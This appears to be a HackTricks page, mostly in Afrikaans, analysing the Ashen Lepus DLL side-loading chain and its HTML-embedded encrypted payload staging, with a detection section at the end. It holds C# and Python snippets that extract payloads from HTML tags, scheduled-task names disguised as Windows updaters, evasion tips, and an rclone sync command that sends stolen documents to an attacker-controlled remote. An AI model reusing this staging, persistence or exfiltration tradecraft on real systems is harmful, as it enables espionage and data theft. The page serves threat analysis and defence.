# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Overview

Ashen Lepus (aka WIRTE) het 'n herhaalbare patroon gewapen wat DLL sideloading, staged HTML payloads, en modular .NET backdoors ketting om permanent binne Middle Eastern diplomatic networks te bly. Die tegniek is herbruikbaar deur enigiemand omdat dit berus op:

- **Archive-based social engineering**: onsinskuldige PDF's instrueer teikens om 'n RAR-argief vanaf 'n file-sharing webwerf af te laai. Die argief bevat 'n werklik- lykende dokumentkyker EXE, 'n kwaadwillige DLL met die naam van 'n vertroude biblioteek (bv. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), en 'n lok-`Document.pdf`.
- **DLL search order abuse**: die slagoffer dubbelklik die EXE, Windows los die DLL-import vanaf die huidige gids op, en die kwaadwillige loader (AshenLoader) voer binne die vertroude proses uit terwyl die lok-PDF oopmaak om verdenking te voorkom.
- **Living-off-the-land staging**: elke volgende fase (AshenStager → AshenOrchestrator → modules) word van die skyf gehou totdat dit nodig is, en gelewer as encrypted blobs wat binne andersins onskuldige HTML responses versteek is.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: die EXE side-loads AshenLoader, wat host recon uitvoer, dit met AES-CTR enkripteer, en dit POST in roterende parameters soos `token=`, `id=`, `q=`, of `auth=` na API-looking paths (bv. `/api/v2/account`).
2. **HTML extraction**: die C2 gee die volgende fase slegs weg wanneer die client IP na die teikenstreek gegeolokeer is en die `User-Agent` by die implant pas, wat sandboxes frustreer. Wanneer die kontroles slaag bevat die HTTP body 'n `<headerp>...</headerp>` blob met die Base64/AES-CTR enkripteerde AshenStager payload.
3. **Second sideload**: AshenStager word ontplooi saam met 'n ander wettige binary wat `wtsapi32.dll` importeer. Die kwaadwillige kopie wat in die binary geïnjekteer is haal meer HTML, hierdie keer sny `<article>...</article>` uit om AshenOrchestrator te herstel.
4. **AshenOrchestrator**: 'n modular .NET controller wat 'n Base64 JSON-konfig decodeer. Die konfig se `tg` en `au` velde word gekonkateneer/gehash in die AES-sleutel, wat `xrk` ontsleutel. Die resulterende bytes dien as 'n XOR-sleutel vir elke module-blob wat daarna gehaal word.
5. **Module delivery**: elke module word beskryf deur HTML-kommentare wat die parser herlei na 'n arbitrêre tag, wat statiese reëls breek wat slegs na `<headerp>` of `<article>` soek. Modules sluit in persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), en file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Selfs al blokkeer of verwyder verdedigers 'n spesifieke element, hoef die operateur slegs die tag wat in die HTML-kommentaar aangedui word te verander om die aflewering te hervat.

### Vinnige Uittrekselhulp (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Omseiling Parallelle

Onlangse HTML smuggling-navorsing (Talos) beklemtoon payloads wat as Base64-stringe binne `<script>`-blokke in HTML-aanhangsels weggesteek is en deur JavaScript tydens runtime gedekodeer word. Dieselfde truuk kan vir C2-reaksies hergebruik word: stage encrypted blobs inside a script tag (or other DOM element) and decode them in-memory before AES/XOR, waardeur die bladsy soos gewone HTML lyk.

## Crypto & C2-verharding

- **AES-CTR everywhere**: huidige loaders inkorporeer 256-bit sleutels plus nonces (bv. `{9a 20 51 98 ...}`) en voeg opsioneel 'n XOR-laag by met strings soos `msasn1.dll` voor/na dekripsie.
- **Infrastructure split + subdomain camouflage**: staging servers is per tool geskei, gehost oor verskillende ASNs, en soms voorgehou deur legitiem-lykende subdomains, sodat die verbranding van een stage nie die res blootstel nie.
- **Recon smuggling**: geënkripteerde geënumeerde data sluit nou Program Files-lyste in om hoë-waarde toepassings te vind en word altyd geënkripteer voordat dit die gasheer verlaat.
- **URI churn**: query parameters en REST paths draai tussen veldtogte (`/api/v1/account?token=` → `/api/v2/account?auth=`), wat brose detections ongeldig maak.
- **Gated delivery**: servers is geo-afgesper en antwoord slegs op werklike implants. Onbevoegde kliënte ontvang onverdagte HTML.

## Persistentie & Uitvoeringslus

AshenStager plaas geplande take wat voorgee as Windows-onderhoudswerke en deur `svchost.exe` uitgevoer word, bv.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Hierdie take herbegin die sideloading chain op opstart of op intervalle, en verseker dat AshenOrchestrator vars modules kan versoek sonder om weer die skyf te raak.

## Gebruik van goedaardige Sync Clients vir Eksfiltrasie

Operateurs plaas diplomatieke dokumente in `C:\Users\Public` (wereld-lesbaar en nie-verdagtig) via 'n toegewyde module, en laai dan die legitime [Rclone](https://rclone.org/) binaire af om daardie gids met aanvaller-opberging te sinchroniseer. Unit42 merk op dat dit die eerste keer is dat hierdie akteur waargeneem is wat Rclone vir eksfiltrasie gebruik, wat in lyn is met die breër tendens om legitime sync-gereedskap te misbruik om in normale verkeer in te meng:

1. **Stage**: kopieer/verzamel teikenlêers in `C:\Users\Public\{campaign}\`.
2. **Configure**: plaas 'n Rclone-config wat na 'n aanvaller-gekontroleerde HTTPS-endpoint wys (bv. `api.technology-system[.]com`).
3. **Sync**: voer `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` uit sodat die verkeer soos normale cloud-backups lyk.

Aangesien Rclone wyd gebruik word vir legitime rugsteun-werkvloeie, moet verdedigers fokus op anomalieë in uitvoering (nuwe binaire lêers, vreemde remotes, of skielike syncing van `C:\Users\Public`).

## Opsporings-punte

- Waarsku oor **signed processes** wat onverwags DLLs laai vanaf user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), veral wanneer die DLL-name oorvleuel met `netutils`, `srvcli`, `dwampi`, of `wtsapi32`.
- Inspekteer verdagte HTTPS-antwoorde vir **groot Base64-blobs ingebed binne ongebruiklike tags** of beskerm deur `<!-- TAG: <xyz> -->` kommentaarreëls.
- Brei HTML-hunting uit na **Base64 strings binne `<script>`-blokke** (HTML smuggling-style staging) wat deur JavaScript gedekodeer word voor AES/XOR-verwerking.
- Soek na **geplande take** wat `svchost.exe` met nie-service argumente hardloop of terugwys na dropper directories.
- Monitor vir **Rclone** binaire wat buite IT-beheerde plekke verskyn, nuwe `rclone.conf`-lêers, of sync-jobs wat van staging-gidse soos `C:\Users\Public` trek.

## Verwysings

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
